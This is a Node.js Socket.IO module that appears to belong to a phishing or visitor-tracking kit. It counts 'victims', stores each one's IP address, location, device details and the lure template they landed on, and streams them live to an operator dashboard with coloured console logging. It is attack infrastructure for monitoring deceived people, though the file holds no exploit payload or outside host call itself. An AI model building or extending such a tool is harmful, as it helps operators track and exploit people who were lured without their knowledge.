      import pico from 'picocolors';
      import { parseUserAgent } from '../utils/helpers.js';

      let ioInstance = null;
      let victimCount = 0;
      const activeVictims = new Map(); 

      export function initSocket(io) {
        ioInstance = io;

        io.on('connection', (socket) => {
          console.log(pico.cyan('   Dashboard connected') + pico.dim(` [${socket.id}]`));

          socket.emit('stats', {
            totalVictims: victimCount,
            online: io.engine.clientsCount - 1 
          });

          socket.emit('history', Array.from(activeVictims.values()).slice(-10));

          socket.on('disconnect', () => {
            console.log(pico.gray('   Dashboard disconnected') + pico.dim(` [${socket.id}]`));
          });
        });
      }

      export function broadcastVictim(victimData) {
        if (!ioInstance) return;

        victimCount++;
        const enriched = {
          id: Date.now() + Math.random().toString(36).substr(2, 9),
          timestamp: new Date().toISOString(),
          localTime: new Date().toLocaleString('en-GB'),
          count: victimCount,
          ...victimData,
          deviceInfo: parseUserAgent(victimData.userAgent)
        };

        activeVictims.set(enriched.ip, enriched);
        if (activeVictims.size > 100) {
          const first = activeVictims.keys().next().value;
          activeVictims.delete(first);
        }

        ioInstance.emit('newVictim', enriched);

        ioInstance.emit('stats', {
          totalVictims: victimCount,
          online: ioInstance.engine.clientsCount
        });

        const { template = 'unknown', ip, location = 'Unknown' } = enriched;
        console.log(
          pico.green('  VICTIM') +
          pico.cyan(` → ${template.padEnd(18)}`) +
          pico.yellow(ip.padEnd(16)) +
          pico.magenta(location)
        );
      }

      export function getStats() {
        return {
          totalVictims: victimCount,
          activeConnections: ioInstance?.engine?.clientsCount || 0,
          uptime: process.uptime()
        };
      }

      export function resetCounter() {
        victimCount = 0;
        activeVictims.clear();
        ioInstance?.emit('stats', { totalVictims: 0, online: ioInstance.engine.clientsCount });
      }

      export default { initSocket, broadcastVictim, getStats, resetCounter };